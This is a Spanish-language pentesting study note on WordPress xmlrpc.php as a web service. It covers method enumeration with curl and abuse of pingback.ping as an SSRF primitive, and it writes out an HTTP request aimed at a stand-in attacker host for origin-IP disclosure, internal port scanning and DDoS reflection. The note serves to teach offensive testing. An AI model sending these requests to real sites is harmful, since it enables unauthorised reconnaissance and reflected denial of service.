---
tags:
  - Web/Red-Team
  - Web-Services
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-17
Nota previa: "[[03 - Command Injection en Web Services]]"
Nota siguiente: "[[05 - Detección y evasión en Web Services]]"
Area: "[[Web Services.base|Web Services]]"
---
---

`xmlrpc.php` de WordPress es un **web service XML-RPC**: transmite datos con XML sobre HTTP. Que esté habilitado <mark style="background: #FFB8EBA6;">no es una vulnerabilidad en sí</mark>, pero según los métodos que exponga, facilita enumeración y explotación. Aquí lo tratamos como superficie de web service; la fuerza bruta de login vía xmlrpc está en [[02 - Login y fuerza bruta en WordPress]].

# Enumerar los métodos disponibles

Detectar si `xmlrpc.php` responde es trivial (`POST` al endpoint). Lo primero es listar qué métodos permite con `system.listMethods`:

```shell-session
$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
...
<value><string>system.multicall</string></value>
<value><string>pingback.ping</string></value>
<value><string>wp.getUsersBlogs</string></value>
...
```

Los métodos que importan: **`wp.getUsersBlogs`** (oráculo de fuerza bruta), **`system.multicall`** (amplificación, [[05 - Detección y evasión en WordPress|detalle en WordPress]]) y **`pingback.ping`**.

# `pingback.ping` — el vector SSRF

Un *pingback* es un comentario automático que WordPress genera al enlazar a otro blog. Si `pingback.ping` está disponible, <mark style="background: #FF5582A6;">se convierte en una primitiva de SSRF</mark> que habilita tres abusos:

```http
POST /xmlrpc.php HTTP/1.1
Host: blog.inlanefreight.com

<methodCall>
<methodName>pingback.ping</methodName>
<params>
  <param><value><string>http://attacker-host.com/</string></value></param>
  <param><value><string>https://blog.inlanefreight.com/2015/10/post/</string></value></param>
</params>
</methodCall>
```

- **IP Disclosure** — si la instancia está tras Cloudflare, el pingback apunta a un host controlado por el atacante (VPS). El servidor WordPress <mark style="background: #FFB86CA6;">se conecta saliente y revela su IP pública real</mark>, saltándose el CDN.
- **XSPA (Cross-Site Port Attack)** — apuntar el pingback contra el propio servidor u hosts internos en distintos puertos. Diferencias de tiempo o de respuesta delatan **puertos abiertos y hosts internos** — un escaneo de puertos por SSRF.
- **DDoS** — llamar a `pingback.ping` en **muchas** instancias WordPress contra un mismo objetivo → ataque de reflexión distribuido.

> [!warning]+ pingback = SSRF de libro
> El `pingback.ping` es un caso clásico de [[00 - Introducción a los ataques server-side|SSRF]]: haces que el servidor emita peticiones a destinos que tú eliges. Vale para desenmascarar IPs tras WAF/CDN, mapear la red interna (metadata cloud incluida) y reflejar tráfico. Muchos WAF y hostings ya filtran `pingback.ping` por defecto por esto, pero <mark style="background: #8000E1A6;">siempre hay que probar `system.listMethods` antes de darlo por muerto</mark>.

> [!info]+ Relación con el módulo de WordPress
> Este es el mismo `xmlrpc.php` que atacamos en [[02 - Login y fuerza bruta en WordPress]] (fuerza bruta amplificada con `system.multicall`) y [[05 - Detección y evasión en WordPress]] (evasión de rate-limiting). Desde la óptica de *web services*, lo relevante es que XML-RPC es una API con métodos enumerables, y `pingback.ping` una función legítima reconvertida en arma.

Con los ataques cubiertos, toca la cara práctica de campo: cómo detectar servicios SOAP/XML-RPC en un objetivo real y evadir sus defensas: [[05 - Detección y evasión en Web Services]].
